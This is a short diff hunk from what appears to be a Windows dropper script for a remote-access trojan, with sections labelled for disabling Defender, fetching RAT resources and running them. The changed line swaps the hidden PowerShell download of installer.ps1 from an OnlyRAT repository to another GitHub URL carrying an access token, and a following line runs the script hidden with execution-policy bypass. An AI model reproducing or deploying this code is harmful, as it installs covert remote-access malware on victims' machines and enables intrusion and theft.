@@ -30,7 +30,7 @@ if '%errorlevel%' NEQ '0' (
 #@disable defender
 
 #@rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubuser.com/CosmodiumCS/OnlyRAT/main/files/installer.ps1 -Outfile installer.ps1"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/Promite/TEST/main/installer.ps1?token=GHSAT0AAAAAABVQ7D7BRW3SIZ67F2FIKUPAYVFYAEQ -Outfile installer.ps1"
 
 #@run
 powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
